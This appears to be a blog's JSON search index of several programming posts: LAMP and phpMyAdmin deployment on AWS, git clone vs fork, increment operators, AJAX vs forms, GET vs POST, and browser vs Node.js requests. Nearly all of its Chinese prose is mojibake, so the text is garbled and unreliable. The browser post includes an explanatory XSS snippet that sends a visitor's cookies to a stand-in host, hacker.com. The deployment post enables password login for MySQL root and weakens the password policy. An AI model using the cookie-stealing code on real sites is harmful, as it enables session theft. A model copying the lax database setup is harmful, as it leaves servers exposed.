è¦ä¸è¦ç¹¼çºŒï¼Ÿè¼¸å…¥ y å°±å¥½ã€‚ å®‰è£ tasksel 1sudo apt install tasksel ä¸€æ¨£è·Ÿä½ èªªè¦å¤šå°‘ç©ºé–“ï¼Œè¦ä¸è¦ç¹¼çºŒï¼Ÿè¼¸å…¥ y å°±å¥½ã€‚ ç”¨ tasksel ä¸‹è¼‰ lamp-server 1sudo tasksel install lamp-server ä¸‹è¼‰ä¸­çš„ç•«é¢ï¼š ä¸‹è¼‰å®Œå¾Œå°±å¯ä»¥æ‰“é–‹ç€è¦½å™¨è¼¸å…¥ ip ä½å€ä¾†çœ‹çœ‹å‰›èª•ç”Ÿçš„ä¼ºæœå™¨ï¼š è¨­å®š phpmyadminæ¥è‘—è¦ä¾†è¨­å®šä¸€äº›è·Ÿ PHP å’Œ MySQL æœ‰é—œçš„æ±è¥¿ã€‚ ä¸‹è¼‰ phpmyadmin 1sudo apt install phpmyadmin ä¸€æ¨£è·Ÿä½ èªªè¦å¤šå°‘ç©ºé–“ï¼Œè¦ä¸è¦ç¹¼çºŒï¼Ÿè¼¸å…¥ y å°±å¥½ã€‚ é€£æ¥ apache2 å…ˆæŒ‰ç©ºç™½éµ å‡ºç¾æ˜Ÿè™Ÿ * æŒ‰ä¸‹ Enter è¨­å®š configuration é€™é‚Šè·Ÿä½ èªª phpmyadmin å¿…é ˆå…ˆå®‰è£ database è·Ÿè¨­å®š configurationï¼Œå¦‚æœä½ æ²’æœ‰è¦æ‰‹å‹•è¨­å®šçš„è©±ï¼Œç›´æ¥æŒ‰ä¸‹ yes å°±å¥½ã€‚ è¨­å®šå¯†ç¢¼ å¡«å®Œä¹‹å¾Œç”¨ tab èšç„¦åˆ° &lt;OK&gt; å†æŒ‰ä¸‹ Enterï¼Œå¦‚æœæ²’å¡«çš„è©±æœƒéš¨æ©Ÿç”¢ç”Ÿï¼ˆé€™çœŸæ˜¯æˆ‘çœ‹éæœ€å²å®³çš„æåš‡æ–¹å¼ï¼‰ï¼Œæ‰€ä»¥æœ€å¥½ä¹–ä¹–å¡«ã€‚ ç¢ºèªå¯†ç¢¼ å†ç¢ºèªä¸€æ¬¡å›‰ã€‚ ç™»å…¥ phpmyadminæ¥è‘—å°±å¯ä»¥åˆ°ç€è¦½å™¨ç¶²å€è¼¸å…¥ IPv4/phpmyadmin é€²åˆ°ç™»å…¥ç•«é¢ã€‚ä½†ä½ æœƒç™¼ç¾æ˜æ˜è¼¸å…¥æ­£ç¢ºå»ç„¡æ³•ç™»å…¥ï¼š ç°¡å–®ä¾†èªªï¼Œå‰›å‰›è¨­çš„å¯†ç¢¼ä¸æ˜¯ root é€™å€‹ä½¿ç”¨è€…ï¼Œè€Œ root é è¨­çš„æ¬Šé™æ˜¯æ²’è¾¦æ³•ç›´æ¥ç”¨å¯†ç¢¼ä¾†ç™»å…¥çš„ã€‚ æ‰€ä»¥é€™é‚Šè¦å…ˆä¿®æ”¹ phpmyadmin çš„è¨­å®šï¼Œè¨­å®šæˆ root å¯ä»¥ç”¨å¯†ç¢¼ç™»å…¥ã€‚ é€²å…¥ mySQL 1sudo mysql -u root mysql ä¸‹ SQL æŒ‡ä»¤ 1UPDATE user SET plugin='mysql_native_password' WHERE User='root'; FLUSH PRIVILEGES; çœ‹åˆ°æœ‰å½±éŸ¿ 1 å€‹æ¬„ä½å°±ä»£è¡¨æˆåŠŸäº†ï¼š 123Query OK, 1 row affected (0.01 sec) # å½±éŸ¿ä¸€å€‹æ¬„ä½Rows matched: 1 Changed: 1 Warnings: 0Query OK, 0 rows affected (0.01 sec) é›¢é–‹ mySQL 1exit è¨­å®š root çš„å¯†ç¢¼ å†æé†’ä¸€æ¬¡ï¼Œå‰›å‰›è¨­å®šçš„å¯†ç¢¼ä¸æ˜¯çµ¦ root ç”¨çš„ï¼Œæ‰€ä»¥é€™é‚Šè¦å†é‡æ–°è¨­å®šä¸€æ¬¡ã€‚ 1sudo mysql_secure_installation æ˜¯å¦è¨­å®šå¯†ç¢¼ï¼Ÿ(y) å¯†ç¢¼å¼·åº¦è¨­å®šï¼š Low (0) = é•·åº¦ &gt;= 8 Medium (1) = é•·åº¦ &gt;= 8ï¼Œè¦æœ‰å¤§å°å¯«å’Œç‰¹æ®Šå­—å…ƒ Strong (2) = é•·åº¦ &gt;= 8ï¼Œè¦æœ‰å¤§å°å¯«ï¼Œç‰¹æ®Šå­—å…ƒå’Œ dictionary fileï¼ˆå­—å…¸æª”ï¼Ÿåæ­£æ‡‰è©²å°±æ˜¯ä¸€ç¨®æ–‡å­—æª”å§ï¼‰ æ€•éº»ç…©çš„è©±é¸ 0 å°±å¥½ï¼Œé™¤éä½ çœŸçš„å¾ˆæ³¨é‡å®‰å…¨æ€§ã€‚ è¼¸å…¥å¯†ç¢¼ï¼š é€™é‚Šè¼¸å…¥æ™‚ç™¼ç¾æ²’æœ‰æ±è¥¿æ˜¯æ­£å¸¸çš„ï¼Œä¸æ˜¯ä½ éµç›¤å£æ‰ã€‚ ç¸½ä¹‹å‘¢ï¼Œç›¸ä¿¡ä½ çš„æ„Ÿè¦ºå°±å°äº†ï¼Œæ¥ä¸‹ä¾†æœƒé€£çºŒå•ä¸€äº›å•é¡Œï¼Œå¯ä»¥éƒ½è¼¸å…¥ yï¼Œæœ€å¾Œçœ‹åˆ° All done! å°± OK äº†ã€‚ åšåˆ°é€™é‚Šå¾Œï¼Œå°±å¯ä»¥å›ç€è¦½å™¨åˆ° phpmyadmin é‡æ–°ç™»å…¥äº†ã€‚ æ¸¬è©¦æª”æ¡ˆç’°å¢ƒè¨­å®šå¥½å¾Œï¼Œå¯ä»¥ä¾†è©¦è‘—æ”¾æª”æ¡ˆä¸Šå»çœ‹çœ‹ã€‚ æ¥ä¸‹ä¾†å°±æ˜¯è€ƒé©—ä½ å° CLI çš„ç†Ÿç·´åº¦äº†ï¼Œè©¦è‘—ç”¨ cd å’Œ ls ä¾†æ‰¾åˆ° var é€™å€‹è³‡æ–™å¤¾å§ã€‚ æ¥è‘—é€²åˆ°è£¡é¢ 1cd var/www/html å˜—è©¦å»ºç«‹ä¸€å€‹æ–°æª”æ¡ˆ 1touch index.php é€™æ™‚å€™æœƒè·Ÿä½ èªªæ¬Šé™ä¸è¶³ï¼ˆPermission deniedï¼‰ï¼Œæ‰€ä»¥è¦ä¾†è¨­å®šä¸€ä¸‹ã€‚ï¼ˆè·Ÿ chmod æ˜¯å·®ä¸å¤šçš„æ¦‚å¿µï¼‰ 1sudo chown ubuntu /var/www/html è¨­å®šå®Œå¾Œæ‡‰è©²å°±èƒ½å»ºç«‹æª”æ¡ˆå›‰ã€‚ æ¥è‘—ç”¨ vim ä¾†å¯«ä¸€äº›æ±è¥¿ï¼š å›åˆ°ç€è¦½å™¨çš„ç¶²å€è¼¸å…¥ IPv4/index.php çœ‹çœ‹æœ‰æ²’æœ‰ work! å¤§åŠŸå‘Šæˆï¼åˆ°é€™é‚Šç‚ºæ­¢ï¼Œä½ å·²ç¶“æŠŠè™›æ“¬ä¸»æ©Ÿçš„ç’°å¢ƒéƒ½è¨­å®šå¥½å›‰ã€‚ ç¬¬ä¸‰æ­¥ï¼šè³¼è²·åŸŸåå…ˆåˆ° gandi è²·ä¸€å€‹è‡ªå·±å–œæ­¡çš„åŸŸåã€‚ï¼ˆæˆ–å»å…¶ä»–åœ°æ–¹è²·ä¹Ÿè¡Œï¼‰ é™„è¨»ï¼šå¾Œä¾†çµå¸³æ‰ç™¼ç¾ .com æ˜¯å…¬å¸æˆ–é›†åœ˜æ‰å¯ä»¥ç”¨çš„åŸŸåï¼Œå“ˆå“ˆï¼ æ¥è‘—æ˜¯ä¸€äº›åŸºæœ¬çš„çµå¸³æµç¨‹ï¼Œå°±ä¸ç‰¹åˆ¥è²¼äº†ï¼Œå› ç‚ºè¦ä¸€ç›´æŠŠå€‹è³‡é¦¬æ‰æœ‰é»éº»ç…©ã€‚ æœ€å¾Œçµå¸³å®Œçš„çµæœï¼š æ¥è‘—è¦ä¾†æŠŠ Domain å’Œ IP ä¸²èµ·ä¾†ï¼Œå…ˆå›åˆ°é¦–é ç™»å…¥ï¼Œæœƒè‡ªå‹•é€²å…¥ä¸»æ§å°ã€‚æ¥è‘—é»é¸åŸŸå &gt; peanu.twï¼ˆä½ è²·çš„åŸŸåï¼‰ &gt; DNS ç´€éŒ„ï¼š æŠŠ A çš„å€¼æ”¹æˆ AWS çš„ Ipv4 å°±å¯ä»¥äº†ã€‚ æœ€å¾Œä½ å°±å¯ä»¥ç”¨ç¶²åŸŸä¾†é€£å•¦ï½ æ–‡æœ«ä»¥ä¸Šå°±æ˜¯éƒ¨ç½²çš„æ•´å€‹éç¨‹ï¼Œå¾ˆé–‹å¿ƒè‡ªå·±æŠŠé€™å€‹æµç¨‹çµ¦è·‘å®Œäº†ã€‚ æœ€å¾Œæ˜¯ä¸€äº›éŒ¯èª¤ç´€éŒ„ é¸åˆ°åŒæ¨£çš„å”å®š The same permission must not appear multiple times ç°¡å–®ä¾†èªªå°±æ˜¯æˆ‘çœ¼æ®˜ï¼Œé¸åˆ°å…©å€‹ HTTPã€‚æ‡‰è©²è¦é¸æ“‡ HTTP å’Œ HTTPS æ‰å°ã€‚ ssh é€£ä¸»æ©Ÿæ™‚ç™¼ç”ŸéŒ¯èª¤ 1234The authenticity of host 'ec2-3-93-242-234.compute-1.amazonaws.com (Ipv4)' can't be established.ED25519 key fingerprint is SHA256:&lt;key-value&gt;.This key is not known by any other namesAre you sure you want to continue connecting (yes/no/[fingerprint])? åƒè€ƒ é€™ç¯‡æ–‡ç«  å¾Œå¾—çŸ¥ï¼ŒåŸä¾†æ˜¯é€é SSH é€£åˆ°æŸå€‹ä¸»æ©Ÿæ™‚ï¼Œæœƒå…ˆæ¯”å°é›™æ–¹çš„ keyï¼ˆé˜²æ­¢ä¸­é–“äººæ”»æ“Šï¼‰ã€‚ä½†æ˜¯æˆ‘å€‘æ˜¯ç¬¬ä¸€æ¬¡é€£ç·šï¼Œé›»è…¦è£¡é¢æ²’æœ‰ä¹‹å‰çš„ public key ç´€éŒ„ï¼Œæ‰€ä»¥æ‰æœƒè·³ä¸Šé¢é‚£å€‹è­¦å‘Šï¼Œç¢ºä¿ä½ æ˜¯å¦ä¿¡ä»»é€™å€‹ä¸»æ©Ÿã€‚ ç¸½ä¹‹å‘¢ï¼Œè¼¸å…¥ yes å°±å¯ä»¥äº†ã€‚é€™å€‹å‹•ä½œè‡ªå‹•æœƒæŠŠ public key å„²å­˜åˆ° ~/.ssh/known_hosts æª”æ¡ˆè£¡ï¼Œé€™æ¨£ä¸‹æ¬¡åœ¨æ¯”å° key çš„æ™‚å€™å°±èƒ½æŸ¥åˆ°ç´€éŒ„äº†ã€‚","link":"/2022/03/08/deploy-my-website/"},{"title":"clone è·Ÿ fork çš„å·®ç•°","text":"æˆ‘ä»¥å‰ä¸€ç›´æ²’ææ¸…æ¥šçš„æ±è¥¿ã€‚ ç”¨æƒ…å¢ƒä¾†è§£é‡‹å¦‚æœä½ å°åˆ¥äººçš„ repository æœ‰èˆˆè¶£ï¼Œä½ å¯ä»¥ï¼š ç”¨ git clone è¤‡è£½åˆ°è‡ªå·±çš„æœ¬åœ°ç«¯ã€‚ä¸éé€™åªèƒ½è®“ä½ åœ¨æœ¬åœ°ç«¯åšä¿®æ”¹ï¼ˆcommitï¼‰ï¼Œä½ æ²’æœ‰è¾¦æ³•æŠŠæœ¬åœ°çš„ä¿®æ”¹å…§å®¹ push åˆ°åˆ¥äººçš„ repositoryã€‚å¦å¤–ï¼Œclone ä¹ŸæœƒæŠŠåŸæœ¬çš„ .git æª”æ¡ˆçµ¦è¤‡è£½ä¸€ä»½ï¼Œæ‰€ä»¥æœƒä¿ç•™åŸæœ¬é€™ä»½å°ˆæ¡ˆçš„ commit è³‡è¨Šã€‚ å…ˆåœ¨ GitHub ä¸Šã€Œforkã€åˆ¥äººçš„å°ˆæ¡ˆåˆ°è‡ªå·±çš„ repositoryï¼Œæ¥è‘—åœ¨æŠŠé€™å€‹è¤‡è£½éä¾†çš„ repository ç”¨ git clone åˆ°è‡ªå·±çš„æœ¬åœ°ç«¯ï¼Œæœ€å¾Œå†æŠŠæœ¬åœ°çš„ä¿®æ”¹ç”¨ gir push ä¾†åšæ›´æ–°ã€‚ å¦‚æœä½ æŠŠ clone ä¸‹ä¾†çš„æª”æ¡ˆæ›´æ–°åˆ push å›å»åˆ¥äººçš„å°ˆæ¡ˆï¼ŒGit æœƒè·³å‡ºä»¥ä¸‹éŒ¯èª¤ï¼š 12remote: Permission to sparanoid/chinese-copywriting-guidelines.git denied to jubeatt.fatal: unable to access 'https://github.com/sparanoid/chinese-copywriting-guidelines.git/': The requested URL returned error: 403 ç°¡å–®ä¾†èªªå°±æ˜¯ä¸å…è¨±çš„æ„æ€ï¼ˆé—œéµå­—ï¼šPermission deniedï¼‰ã€‚","link":"/2021/12/13/difference-between-clone-and-fork/"},{"title":"++ è·Ÿ -- æ”¾å‰é¢å¾Œé¢çš„å·®åˆ¥","text":"å¥½åƒæ˜¯ä»¥å‰å¸¸è¦‹çš„è€ƒé¡Œã€‚ ç°¡å–®ä¾†èªªï¼Œæ”¾å‰é¢çš„æ„æ€å°±æ˜¯ã€Œå…ˆæŠŠ a + 1ã€ï¼Œåœ¨åŸ·è¡Œé‚£ä¸€è¡Œæ•˜è¿°å¥ï¼›åéä¾†ï¼Œæ”¾å¾Œé¢çš„æ„æ€æ˜¯ã€Œå…ˆåŸ·è¡Œé‚£ä¸€è¡Œæ•˜è¿°å¥ã€ï¼Œåšå®Œæ‰æŠŠ a + 1ã€‚ a++123var a = 0console.log(a++ &amp;&amp; 30) // 0console.log(a) // 1 ä½ å¯ä»¥æŠŠå®ƒæƒ³æˆæ˜¯é€™æ¨£ï¼š 123console.log(a &amp;&amp; 30) // 0a+=1console.log(a) // 1 ++aåéä¾†ä¹Ÿä¸€æ¨£ï¼š 123var a = 0console.log(++a &amp;&amp; 30) // 30console.log(a) // 1 ä¸€æ¨£æƒ³æˆæ˜¯é€™æ¨£ï¼š 123a+=1console.log(a &amp;&amp; 30) // 30console.log(a) // 1 é‹ç”¨åœ¨è¿´åœˆä¸­æ‡‚å‰é¢çš„é‚è¼¯å¾Œï¼Œä½ å¯ä»¥æŠŠå¸¸è¦‹çš„è¿´åœˆå¯«æˆé€™æ¨£ï¼š 1234var i = 0while (i &lt;= 10) { console.log(i++)} å…¶å¯¦å°±è·Ÿå¸¸è¦‹å¯«æ³•çš„æ„æ€ç›¸åŒï¼Œåªæ˜¯çœ‹èµ·ä¾†æ¯”è¼ƒç°¡æ½”è€Œå·²ã€‚","link":"/2021/12/17/difference-between-plusplus-and-minusminus/"},{"title":"ç”¨ AJAX è·Ÿ Form è¡¨å–®ç™¼ request çš„å·®ç•°","text":"å°çŸ¥è­˜å¤§å­¸å•ã€‚ Formåœ¨ devtool ä¸Šçš„ type æœƒæ˜¯ï¼šdocument æœ€å¤§çš„å•é¡Œæ˜¯ã€Œæœƒæ›é ã€ï¼ŒåŸå› æ˜¯ç€è¦½å™¨ä¸€æ‹¿åˆ° response æ™‚å°±æœƒ render å‡ºä¾†ã€‚ å¦å¤–è¦æ³¨æ„é€™ç¨®ç™¼ request çš„æ–¹æ³•æ˜¯é€é HTMLï¼Œè·Ÿ JavaScript ä¸€é»é—œä¿‚éƒ½æ²’æœ‰ã€‚ AJAXåœ¨ devtool ä¸Šçš„ type æœƒæ˜¯ï¼šxhr æœ€å¤§çš„å„ªé»æ˜¯ã€Œä¸æœƒæ›é ã€ï¼Œç€è¦½å™¨æ‹¿åˆ° response å¾Œæœƒã€Œå‚³çµ¦ JavaScriptã€è€Œä¸æ˜¯ç›´æ¥ render å‡ºä¾†ã€‚ ç°¡å–®ç¤ºç¯„ï¼š 1234567891011121314151617181920212223242526const request = new XMLHttpRequest()// æ‹¿åˆ° response çš„è™•ç†request.addEventListener('load', function() { if (request.status &gt;= 200 &amp;&amp; request.status &lt; 400) { console.log('success') console.log(request.responseText) } else { console.log('err')\\ }})// æ²’æœ‰æ‹¿åˆ° responseï¼Œä»£è¡¨å‡ºéŒ¯request.addEventListener('error', function() { console.log('err')})/* @param1: è¦ä½¿ç”¨çš„ HTTP method @param2: è¦ç™¼åˆ°å“ªè£¡ @param3: éåŒæ­¥ï¼ˆtrueï¼‰ or åŒæ­¥ï¼ˆfalseï¼‰*/request.open('GET', 'https://reqres.in/api/users/1', true)/* åŸ·è¡Œåˆ°é€™ä¸€è¡Œå°±æœƒç™¼ request äº†ï¼Œ æ‰€ä»¥ event listener ä¸€å®šè¦å¯«åœ¨å‰é¢*/request.send() è¦æ³¨æ„ä¸€ä¸‹ response æœƒè¢«ç¶åœ¨ XMLHttpRequest çš„å±¬æ€§ä¸Šï¼Œä¸åƒåœ¨ Node.js è£¡ç”¨ request å¥—ä»¶æ˜¯å‚³åˆ° callback è£¡é¢ã€‚","link":"/2022/01/25/diffrence-between-ajax-and-form/"},{"title":"form çš„ GET èˆ‡ POST çš„å·®ç•°","text":"æˆ‘è¦ºå¾—å¾ˆé‡è¦ã€‚ æ‡¶äººåŒ…GET çš„ç‰¹æ€§æœ€é‡è¦çš„é»ï¼šç¶²å€æœƒè®Š æŒ‰ä¸‹ submit çš„æ™‚å€™ï¼Œç¶²å€æœƒåœ¨å¾Œé¢åŠ ä¸Š ?parameter=value ä¸æœƒæœ‰ request bodyï¼Œå› ç‚ºæ²’æœ‰æ±è¥¿è¦å¸¶å»çµ¦å¾Œç«¯ ç¶²å€æœ‰é•·åº¦é™åˆ¶ ç¶²å€ä¸å¯ä»¥æ”¾æ•æ„Ÿè³‡è¨Š æœƒè‡ªå‹•åš URL encodedï¼ˆå¾ˆé‡è¦ï¼‰ èˆ‰ä¾‹ä¾†èªªï¼š å¦‚æœä»Šå¤©åœ¨è¼¸å…¥æ¡†è¼¸å…¥ a=1ï¼Œå¦‚æœæ²’æœ‰ encoded çš„è©±ï¼Œç¶²å€å°±æœƒè®Šæˆæ˜¯ ?name=a=1ï¼Œä½†é€™æ¨£å­å¾Œç«¯æœƒå¾ˆå›°æ“¾ï¼Œå› ç‚ºå¾Œç«¯æ˜¯é€é = ä¾†æŠŠ key è·Ÿ value çµ¦åˆ‡å‰²çš„ï¼Œæ‰€ä»¥å¿…é ˆ encoded æˆ ?name=a%3D1 è£œå……ï¼šJavaScript è£¡é¢æœ‰æä¾› encoded è·Ÿ decoded çš„ function 12encodeURIComponent('a=1') =&gt; \"a%3D1\"decodeURIComponent('a%3D1') =&gt; \"a=1\" æ‰€ä»¥å¾Œç«¯å¤§æ¦‚ä¹Ÿæ˜¯é€™æ¨£æ“ä½œçš„ã€‚ POST çš„ç‰¹æ€§æœ€é‡è¦çš„é»ï¼šç¶²å€ä¸æœƒè®Šï¼Œçœ‹ä¸å‡ºå·®ç•° æœƒæŠŠæ±è¥¿æ”¾åœ¨ request body è£¡é¢ å¯ä»¥æ”¾æ•æ„Ÿè³‡è¨Šï¼Œå› ç‚ºå¾ç¶²å€çœ‹ä¸å‡ºä»»ä½•æ±è¥¿ å¦‚æœè¡¨å–®å…§å®¹æœ‰ç‰¹æ®Šæ–‡å­—æˆ–ä¸­æ–‡å­—ï¼Œä¸€æ¨£æœƒè¢« encodeï¼ˆå¯æ‰“é–‹ payload æŸ¥çœ‹ï¼‰ å°çŸ¥è­˜Q1. ç‚ºä»€éº¼ä½ è²¼æœå°‹çµæœé é¢çµ¦åˆ¥äººï¼Œåˆ¥äººå¯ä»¥è·Ÿä½ çœ‹åˆ°ä¸€æ¨£çš„æœå°‹çµæœé é¢ï¼Ÿ Aï¼šå› ç‚ºæœå°‹çµæœé é¢æ˜¯é€é GET æ–¹æ³•ä¾†å–å¾—çš„ï¼Œè€Œ GET æ˜¯åœ¨ç¶²å€ä¸ŠåŠ ä¸Šåƒæ•¸ï¼Œæ‰€ä»¥åªè¦ç”¨ä¸€æ¨£çš„åƒæ•¸å»ç™¼é€ requestï¼Œä¼ºæœå™¨å°±èƒ½æ ¹æ“šåƒæ•¸çš„å…§å®¹ response ä¸€æ¨£çš„é é¢ã€‚ Q2. ç‚ºä»€éº¼åœ¨å¡«è¡¨å–®çš„é é¢è¦é›¢é–‹æ™‚ï¼Œéƒ½æœƒè·³ä¸€å€‹è¦–çª—å•ä½ ã€ŒçœŸçš„è¦é›¢é–‹å—ï¼Ÿå…§å®¹å¯èƒ½æœƒéºå¤±â€¦ã€çš„å•é¡Œï¼Ÿ Aï¼šå› ç‚ºè¦å¸¶çµ¦è³‡æ–™åˆ°å¾Œç«¯ä¸€å®šè¦ç”¨ POST æ‰å¯ä»¥ï¼Œè€Œ POST çš„ç‰¹æ€§æ˜¯ã€Œç¶²å€ä¸æœƒè®Šã€ï¼Œæ‰€ä»¥å¦‚æœè¡¨å–®å¡«åˆ°ä¸€åŠå°±é›¢é–‹ï¼Œé€™äº›å…§å®¹æ˜¯æ²’è¾¦æ³•è¢«ä¿å­˜çš„ï¼Œå› ç‚ºç¶²å€å°±é•·é‚£æ¨£å­ã€‚æ‰€ä»¥ä¹Ÿä¸å¯èƒ½ç™¼ç”Ÿä½ è²¼ä¸€å€‹ç¶²å€çµ¦åˆ¥äººå°±è½‰å¸³æˆåŠŸçš„æƒ…æ³ã€‚","link":"/2022/01/06/diffrence-between-form-get-and-post/"},{"title":"åœ¨ Node.js è·Ÿç€è¦½å™¨ä¸Šç™¼ request çš„å·®ç•°","text":"å°å¸¸è­˜ã€‚ ç°¡è¿°ä¸€å€‹æ˜¯ç›´æ¥ç™¼å¹«ä½ ç™¼ï¼Œä¸€å€‹æ˜¯è¦ç¶“éã€Œç€è¦½å™¨ã€ã€‚å¾Œè€…çš„é™åˆ¶æ¯”è¼ƒå¤šï¼Œä¾‹å¦‚ã€ŒCROSã€ã€ã€ŒSame Origin Policyã€ç­‰ç­‰ã€‚ä¼ºæœå™¨å‚³ response ä¹Ÿæ˜¯ä¸€æ¨£ï¼Œå¾Œè€…è¦ç¶“éç€è¦½å™¨é€™ä¸€æ­¥ã€‚ é™¤äº†å„ç¨®é™åˆ¶ä¹‹å¤–ï¼Œé‚„æœƒè¢«ã€ŒåŠ æ–™ã€åƒæ˜¯ user-agent é€™é¡çš„ headerï¼Œä¼ºæœå™¨å¯ä»¥å¾ä¸­å¾—åˆ°è³‡è¨Šã€‚ Same origin policyç™¼ request çš„æ™‚å€™ç€è¦½å™¨æœƒè‡ªå‹•å¹«ä½ åŠ ä¸Š origin é€™å€‹ headerï¼Œè®“ server çŸ¥é“ã€Œä¾†æºã€æ˜¯å“ªè£¡ï¼Œæ¥è‘— server åœ¨é€éã€ŒCROSã€ä¾†æ±ºå®šè¦è®“èª°å¯ä»¥å­˜å–è³‡æº Access-Control-Allow-Origin ä¾‹å­å¯ä»¥ç›´æ¥åƒè€ƒï¼šå¾éŠæˆ²ä¾†èªè­˜ CORS èˆ‡ç€è¦½å™¨çš„é™åˆ¶ ç‚ºä»€éº¼åªæœ‰ç€è¦½å™¨æœ‰é™åˆ¶ï¼Ÿé¦–å…ˆæ˜¯ç’°å¢ƒçš„å·®ç•°ï¼Œç€è¦½å™¨æ˜¯ã€Œå…¬å…±ç’°å¢ƒã€ã€Node.js æ˜¯ã€Œç§æœ‰ç’°å¢ƒã€ã€‚åœ¨å…¬å…±ç’°å¢ƒä¸‹å°±å¾—ç‰¹åˆ¥æ³¨æ„ã€Œéš±ç§æ€§ã€çš„å•é¡Œã€‚ ç€è¦½å™¨çš„ cookie æœƒå„²å­˜ä¸€äº›å€‹äººè³‡æ–™ï¼Œåƒæ˜¯å¸³è™Ÿå¯†ç¢¼ã€‚è€Œç€è¦½å™¨ç™¼ request åˆ°æŸå€‹ Domain çš„æ™‚å€™éƒ½æœƒå¸¶ä¸Šå°æ‡‰çš„ cookieã€‚ åˆ©ç”¨ã€Œè‡ªå‹•å¸¶ä¸Š cookieã€çš„é€™å€‹ç‰¹æ€§ï¼Œå£äººå°±æœ‰æ©Ÿæœƒç«Šå–ä½ çš„ cookieï¼Œåƒè€ƒä¸‹é¢çš„ä¾‹å­ã€‚ å‡è¨­æˆ‘æ˜¯å£äººï¼Œæˆ‘å¯ä»¥åœ¨æœ‰ XSS æ¼æ´çš„ç¶²ç«™åµŒå…¥ä»¥ä¸‹å…§å®¹ï¼š 123456const hackerServer = `https://hacker.com?cookie=${escape(document.cookie)}`const img = document.createElement('img')img.setAttribute('src', hackerServer)document.querySelector('body').appendChild(img) ç•¶ä½¿ç”¨è€…ä¾†åˆ°è¢«ã€ŒåŠ æ–™ã€å¾Œçš„æ¼æ´ç¶²ç«™å¾Œï¼Œå°±æœƒè‡ªå‹•æŠŠ cookie é€åˆ°ã€Œé§­å®¢çš„å¾Œç«¯ä¼ºæœå™¨ã€ï¼Œæ¥è‘—é§­å®¢å°±å¯ä»¥æ‹¿ cookie ä¾†åšå£äº‹äº†ã€‚ è©³ç´°æ­¥é©Ÿæ˜¯é€™æ¨£ï¼š åœ¨æ¼æ´ç¶²ç«™åµŒå…¥åœ–ç‰‡ï¼Œé€™å€‹åœ–ç‰‡çš„ç¶²å€æ˜¯ã€Œé§­å®¢çš„ä¼ºæœå™¨ä½ç½®ã€+ã€Œä½¿ç”¨è€…åœ¨é€™å€‹ç¶²ç«™çš„ cookieã€ åœ–ç‰‡è¼‰å…¥çš„æ™‚å€™å°±æœƒè‡ªå‹•ç™¼ requestï¼Œæ‰€ä»¥ä½¿ç”¨è€…æ ¹æœ¬ä¸çŸ¥é“è‡ªå·±çš„ cookie è¢«å·äº† è©³ç´°å¯ä»¥åƒè€ƒé€™å€‹ç¶²ç«™ å¦å¤– [FE102] æåˆ°çš„ã€Œemail æ”¶ä»¶é€šçŸ¥ã€çš„åŸç†ä¹Ÿè·Ÿé€™å€‹å·®ä¸å¤šã€‚","link":"/2022/01/25/diffrence-between-nodejs-and-browser/"},{"title":"æ•¸å­—ç³»çµ±ä¸¦æ²’æœ‰ä½ æƒ³çš„é‚£éº¼è¤‡é›œ","text":"å‰è¨€ä»Šå¤©è¦è«‡çš„ä¸»é¡Œæ˜¯ã€Œæ•¸å­—ç³»çµ±ã€ æ•¸å­—ç³»çµ±åœ¨æˆ‘å€‘çš„ç”Ÿæ´»æˆ–è¨±ä¸æ€éº¼èµ·çœ¼ï¼Œä½†å¦‚æœæ˜¯åœ¨é›»è…¦ç§‘å­¸é€™å€‹é ˜åŸŸï¼Œå°±å¾ˆé›£ä¸è«‡åˆ°å®ƒäº†ã€‚ä¸çŸ¥é“å„ä½æœƒä¸æœƒè·Ÿæˆ‘ä¸€æ¨£ï¼Œä¸€ç›´å°æ–¼æ•¸å­—ç³»çµ±æœ‰é»ä¼¼æ‡‚éæ‡‚çš„æ„Ÿè¦ºï¼Œæˆ–è€…æ˜¯éœ€è¦ç”¨åˆ°æ™‚å°±æ»¿é ­éœ§æ°´ã€‚åŸºæ–¼é€™å€‹åŸå› ï¼Œæ‰€ä»¥æˆ‘æ±ºå®šå¯«ä¸€ç¯‡æ–‡ç« ä¾†è¨˜éŒ„ï¼Œå¸Œæœ›è·Ÿæˆ‘æœ‰ä¸€æ¨£é€™ç¨®å›°æ“¾çš„å„ä½èƒ½å¤ å¥½å¥½ç´®å¯¦åœ°æŠŠé€™äº›é‡è¦çŸ¥è­˜çµ¦å­¸èµ·ä¾†ï¼ å­¸ç¿’ç›®æ¨™ äº†è§£æ•¸å­—ç³»çµ±ï¼ˆçŸ¥é“ä»€éº¼æ˜¯äºŒé€²ä½ã€å…«é€²ä½ã€åé€²ä½ã€åå…­é€²ä½ï¼‰ çŸ¥é“æ€éº¼æŠŠè½‰æ›é€²ä½åˆ¶ï¼ˆä¾‹å¦‚ï¼šåé€²ä½è½‰æˆäºŒé€²ä½ï¼‰ çŸ¥é“æ€éº¼å¯«å‡ºä¸€å€‹èƒ½å¤ è½‰æ›é€²ä½åˆ¶çš„ç¨‹å¼ç¢¼ æ­£æ–‡èªè­˜æ•¸å­—ç³»çµ±åœ¨å­¸æ€éº¼å°æ•¸å­—åšè½‰æ›å‰ï¼Œç•¶ç„¶è¦å…ˆçŸ¥é“ä»€éº¼å«æ•¸å­—ç³»çµ±ï¼Œæ‰€ä»¥é€™è£¡æœƒå…ˆç°¡å–®ä»‹ç´¹ä¸€ä¸‹é—œæ–¼æ•¸å­—ç³»çµ±çš„çŸ¥è­˜ã€‚ æ•¸å­—ç³»çµ±å¯ä»¥åˆ†ç‚ºï¼š äºŒé€²ä½ï¼ˆBinaryï¼‰ å…«é€²ä½ï¼ˆOctalï¼‰ åé€²ä½ï¼ˆDecimalï¼‰ åå…­é€²ä½ï¼ˆHexadecimalï¼‰ å…ˆå¾æˆ‘å€‘ç”Ÿæ´»ä¸­æœ€ç†Ÿæ‚‰çš„çš„åé€²ä½ä¾†åšèªªæ˜å§ã€‚ï¼ˆæˆ‘å€‘ç¾åœ¨æ­£åœ¨ä½¿ç”¨çš„æ•¸å­—ç³»çµ±å°±æ˜¯åé€²ä½ï¼‰ é¡Œå¤–è©±ï¼šç‚ºä»€éº¼æˆ‘å€‘çš„æ•¸å­—ç³»çµ±æ˜¯ 10 é€²ä½ï¼Ÿ ä¹Ÿè¨±æ˜¯å› ç‚ºæˆ‘å€‘äººåªæœ‰ 10 æ ¹æ‰‹æŒ‡é ­å§â€¦ å¦‚æœä½ å°æ–¼ã€Œé€²ä½ã€é€™å€‹è©æ„Ÿåˆ°å¾ˆå®³æ€•æˆ–é™Œç”Ÿçš„è©±ï¼Œåˆ¥æ“”å¿ƒã€‚ å…¶å¯¦è¬›çš„ç™½è©±ä¸€é»ï¼Œé€™åªæ˜¯ç”¨ä¾†ä»£è¡¨ 